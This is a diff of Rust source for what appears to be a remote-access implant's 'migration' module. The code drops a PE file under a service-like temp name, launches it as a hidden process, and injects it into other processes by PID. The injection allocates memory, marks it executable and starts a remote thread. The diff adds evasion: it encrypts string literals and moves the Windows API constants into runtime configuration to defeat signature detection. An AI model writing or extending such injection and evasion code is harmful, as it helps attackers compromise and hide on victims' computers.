@@ -12,6 +12,8 @@
 // instance has connected.
 
 use std::fs;
+use crate::strcrypt_rt;
+use strcrypt::aes_str;
 
 /// Read the current agent binary from disk.
 /// Falls back to reading /proc/self/exe on Linux.
@@ -207,12 +209,8 @@ pub mod windows {
         dw_thread_id: u32,
     }
 
-    const CREATE_SUSPENDED: u32 = 0x00000004;
-    const MEM_COMMIT: u32 = 0x1000;
-    const MEM_RESERVE: u32 = 0x2000;
-    const PAGE_READWRITE: u32 = 0x04;
-    const PAGE_EXECUTE_READ: u32 = 0x20;
-    const PAGE_EXECUTE_READWRITE: u32 = 0x40;
+    // MEM_* / PAGE_* / PROCESS_ALL_ACCESS are read from
+    // config().ffi_windows at runtime (values mirror winnt.h).
 
     /// Spawn the agent as a new hidden process.
     ///
@@ -225,7 +223,7 @@ pub mod windows {
         let _ = binary_path; // unused - we spawn the PE directly, not a host process
         
         let temp_dir = std::env::temp_dir();
-        let temp_name = random_temp_name("svc_", "exe");
+        let temp_name = random_temp_name(&aes_str!("svc_"), &aes_str!("exe"));
         let temp_path = temp_dir.join(&temp_name);
         fs::write(&temp_path, pe_bytes).map_err(|e| format!("Write temp: {}", e))?;
 
@@ -234,12 +232,13 @@ pub mod windows {
         // agent process locks the file and Windows prohibits write access.
         let mut guard = TempFileGuard::new(temp_path.clone());
 
-        let app = CString::new(temp_path.to_string_lossy().as_ref()).map_err(|_| "Invalid path")?;
+        let app = CString::new(temp_path.to_string_lossy().as_ref()).map_err(|_| aes_str!("Invalid path"))?;
         let mut si: STARTUPINFOA = mem::zeroed();
         si.cb = mem::size_of::<STARTUPINFOA>() as u32;
         let mut pi: PROCESS_INFORMATION = mem::zeroed();
 
-        // CREATE_NO_WINDOW (0x08000000) hides the console
+        // CREATE_NO_WINDOW (0x08000000) hides the console.
+        // OS-fixed (winnt.h), not mirrored by the typed FFI config.
         const CREATE_NO_WINDOW: u32 = 0x08000000;
         if CreateProcessA(
             app.as_ptr(), ptr::null_mut(), ptr::null_mut(), ptr::null_mut(),
@@ -271,6 +270,7 @@ pub mod windows {
             extern "system" {
                 fn MoveFileExW(src: *const u16, dst: *const u16, flags: u32) -> i32;
             }
+            // OS-fixed (winnt.h), not mirrored by the typed FFI config.
             const MOVEFILE_DELAY_UNTIL_REBOOT: u32 = 0x4;
             let wide_path: Vec<u16> = temp_path.to_string_lossy()
                 .encode_utf16()
@@ -292,8 +292,8 @@ pub mod windows {
                      }}",
                     path_escaped
                 );
-                let _ = std::process::Command::new("powershell")
-                    .args(["-NoProfile", "-WindowStyle", "Hidden", "-Command", &ps_cmd])
+                let _ = std::process::Command::new(aes_str!("powershell"))
+                    .args([aes_str!("-NoProfile"), aes_str!("-WindowStyle"), aes_str!("Hidden"), aes_str!("-Command"), ps_cmd])
                     .spawn();
             }
         }
@@ -310,9 +310,9 @@ pub mod windows {
         extern "system" {
             fn OpenProcess(access: u32, inherit: i32, pid: u32) -> *mut c_void;
         }
-        const PROCESS_ALL_ACCESS: u32 = 0x001F0FFF;
 
-        let h_process = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
+        let h_process = OpenProcess(
+            crate::config::config().ffi_windows.process_all_access, 0, pid);
         if h_process.is_null() {
             return Err(format!("OpenProcess({}) failed: {}", pid, GetLastError()));
         }
@@ -341,16 +341,20 @@ pub mod windows {
             fn GetProcAddress(module: *mut c_void, name: *const i8) -> *mut c_void;
         }
 
-        if pe_bytes.len() < 0x40 { return Err("PE too small".into()); }
+        // Win32 allocation/protection flags from the typed FFI config
+        // (defaults match winnt.h). Fetched once per call.
+        let ffi = &crate::config::config().ffi_windows;
+
+        if pe_bytes.len() < 0x40 { return Err(aes_str!("PE too small")); }
 
         // Parse DOS/NT headers
         let dos_magic = u16::from_le_bytes([pe_bytes[0], pe_bytes[1]]);
-        if dos_magic != 0x5A4D { return Err("Invalid DOS header".into()); }
+        if dos_magic != 0x5A4D { return Err(aes_str!("Invalid DOS header")); }
         let e_lfanew = u32::from_le_bytes(pe_bytes[0x3C..0x40].try_into().unwrap()) as usize;
-        if e_lfanew + 0x108 > pe_bytes.len() { return Err("NT header out of bounds".into()); }
+        if e_lfanew + 0x108 > pe_bytes.len() { return Err(aes_str!("NT header out of bounds")); }
 
         let nt_sig = u32::from_le_bytes(pe_bytes[e_lfanew..e_lfanew+4].try_into().unwrap());
-        if nt_sig != 0x4550 { return Err("Invalid PE signature".into()); }
+        if nt_sig != ffi.image_nt_signature { return Err(aes_str!("Invalid PE signature")); }
 
         // File header
         let fh = e_lfanew + 4;
@@ -366,12 +370,12 @@ pub mod windows {
         // Try preferred base, fall back to any address
         let mut remote_base = VirtualAllocEx(
             h_process, image_base as *mut c_void,
-            size_of_image, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
+            size_of_image, ffi.mem_commit | ffi.mem_reserve, ffi.page_readwrite
         );
         if remote_base.is_null() {
             remote_base = VirtualAllocEx(
                 h_process, ptr::null_mut(),
-                size_of_image, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
+                size_of_image, ffi.mem_commit | ffi.mem_reserve, ffi.page_readwrite
             );
         }
         if remote_base.is_null() {
@@ -514,7 +518,7 @@ pub mod windows {
 
         // Set memory to executable
         let mut old = 0u32;
-        VirtualProtectEx(h_process, remote_base, size_of_image, PAGE_EXECUTE_READWRITE, &mut old);
+        VirtualProtectEx(h_process, remote_base, size_of_image, ffi.page_execute_readwrite, &mut old);
 
         // Create remote thread at entry point
         let entry = (remote_base as usize + entry_rva) as *const c_void;
@@ -548,7 +552,7 @@ pub mod linux {
     /// Here we do the fork+exec approach since it's more reliable.
     pub fn spawn_migrate(pe_bytes: &[u8]) -> Result<String, String> {
         let temp_dir = std::env::temp_dir();
-        let temp_name = random_temp_name(".", "dll");
+        let temp_name = random_temp_name(&aes_str!("."), &aes_str!("dll"));
         let temp_path = temp_dir.join(&temp_name);
 
         fs::write(&temp_path, pe_bytes).map_err(|e| format!("Write: {}", e))?;
@@ -586,7 +590,7 @@ pub fn migrate_spawn(binary_path: &str) -> Result<String, String> {
     { let _ = binary_path; return linux::spawn_migrate(&pe_bytes); }
 
     #[cfg(not(any(target_os = "windows", target_os = "linux")))]
-    Err("Migration not supported on this OS".into())
+    Err(aes_str!("Migration not supported on this OS"))
 }
 
 /// Inject the agent into an existing process by PID.
@@ -601,6 +605,6 @@ pub fn migrate_inject(pid: u32) -> Result<String, String> {
     {
         let _ = pid;
         let _ = pe_bytes;
-        Err("PID migration requires Windows (use migrate:spawn on Linux)".into())
+        Err(aes_str!("PID migration requires Windows (use migrate:spawn on Linux)"))
     }
 }
